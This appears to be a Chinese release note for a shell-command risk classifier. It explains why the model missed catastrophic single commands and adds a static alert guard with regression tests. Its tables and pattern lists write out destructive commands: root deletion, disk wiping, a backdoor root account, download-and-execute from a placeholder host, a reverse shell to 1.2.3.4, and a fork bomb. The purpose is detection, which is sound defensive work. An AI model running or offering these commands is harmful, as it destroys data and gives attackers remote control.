# v1.1.2：高危单命令静态守卫（修复 `rm -rf /` 级别漏报）

日期：2026-09-23
上一版本：v1.1.1（已修复温度缩放，见 `reports/C_TEMP_FIX_v1.1.1_zh.md`）

## 1. 触发场景与结论

用户测试 `cmdrisk /tmp/b`，`/tmp/b` 内容为 `rm -rf /`：

```text
1	-8.20985794	3.35833683e-05	0    ← 模型判定：不告警
```

结论：**这是一次真实的严重漏报**。`rm -rf /` 是灾难级破坏命令，而标定后的
session-FPR 1% 操作点把这条单命令判为 0。这不是单点偶发：

| 灾难级单命令 | 模型概率 | 阈值 1.18e-04 判定 |
|---|---:|---|
| `rm -rf /` | 3.36e-05 | 0（漏报） |
| `rm -rf / --no-preserve-root` | 4.16e-05 | 0 |
| `mkfs.ext4 /dev/sda1` | 4.67e-05 | 0 |
| `dd if=/dev/zero of=/dev/sda bs=1M` | 5.06e-05 | 0 |
| `echo c > /proc/sysrq-trigger` | 6.73e-05 | 0 |
| `useradd -o -u 0 -g 0 backdoor` | 3.78e-05 | 0 |
| `chmod -R 000 /` | 4.57e-05 | 0 |
| `curl -sL http://x/a.sh \| bash` | 3.28e-05 | 0 |
| `bash -i >& /dev/tcp/1.2.3.4/4444 0>&1` | 3.44e-05 | 0 |
| `rm -rf $HOME` | 2.57e-05 | 0 |
| `pkill -9 -1` | 3.13e-05 | 0 |

## 2. 为什么模型会漏掉这类命��（诚实解释）

1. 模型训练/校准在**多命令会话前缀（带时间间隔）**上；单条命令、无时间戳是
   分布外输入，评分落在低概率先验带内。
2. 校准阈值按 session-FPR ≤1% 拟合，把危险单命令的近阈值质量几乎全部压到
   阈值下方。
3. 词汇层面 `rm -rf /` 与良性的 `rm -rf /tmp/a` 只差一个 token，模型在
   13-token 序列上无法稳定区分“爆半径”差异。
因此：**单命令场景不能只依赖模型分判定；必须叠加确定性高危模式层。**

## 3. 修复方案：静态高危守卫（`tools/cmdrisk_static_guard.h`）

- 新增 `static_critical()` 确定性模式集：
  - 根文件系统/供应链摧毁：`rm -rf /`、`/*`、`/etc /var /usr /bin /lib /opt /home /root /boot`、
    `$HOME`、`~`、`--no-preserve-root`
  - 裸盘破坏：`mkfs* /dev/*`、`dd ... of=/dev/*`、`shred /dev/*`、
    `wipefs/fdisk/parted/debugfs -w /dev/*`
  - 内核崩溃：`echo c > /proc/sysrq-trigger`、`sys.kernel.panic`
  - 特权后门：`useradd/usermod -u 0`
  - 全杀/杀 init：`kill -9 1`、`kill -9 -1`（含 `pkill -9 -1` 子串）
  - 递归整机权限：`chmod -R 000 /`、`chmod -R 777 /`
  - 下载即执行：`curl/wget ... | sh/bash`
  - 反弹 shell：`/dev/tcp/`、`nc/ncat -e /bin/sh`、`bash -i >&`
  - fork bomb：`(){ :|:& };:` / `:(){ :|:&};:`
- 命中即 `rule_hit=1` 且 **decision 强制=1（只告警，不放行/不阻断）**；
  守卫永远不把 1 改成 0。

## 4. 输出格式变化（向后兼容地新增第 5 列）

```text
行号 <TAB> mal_logit <TAB> mal_prob <TAB> decision <TAB> rule_hit
```

- `decision = (mal_prob >= threshold) || rule_hit`
- `rule_hit=1` 时 stderr 输出 `static-critical-pattern force-alert`。

## 5. 验证（全部进 CI `make -f Makefile.release smoke`）

| 检查 | 结果 |
|---|---:|
| `ci_assets/regression_critical.txt` 13 行高危样本 | 13/13 decision=1, rule_hit=1 |
| `ci_assets/regression_borderline.txt` 15 行近阈值/良性对照 | 15/15 decision=0, rule_hit=0 |
| `rm -rf /tmp/a`（良性对照） | rule_hit=0（不受守卫影响） |
| `dd if=/dev/sda of=/tmp/backup.img`（只读备份对照） | rule_hit=0 |
| 真实恶意 smoke 8 行 | 8/8 decision=1 |
| 258 真实前缀 C vs Python 决策一致 | 258/258（模型逻辑未变） |

## 6. 交付后仍要遵守的边界

- 守卫是**告警级兜底**，不是放行机制；高危告警必须进入人工复核流程。
- 单命令、无时间戳输入仍是模型分布外场景；���产建议同时启用在探针截断会话语义。
- 后续模型层改进方向：把灾难级单命令作为训练负样本集加入 v6 训练与校准，
  并在 `promotion gates` 中新增 `critical-single-command recall >= 0.995` 门禁。
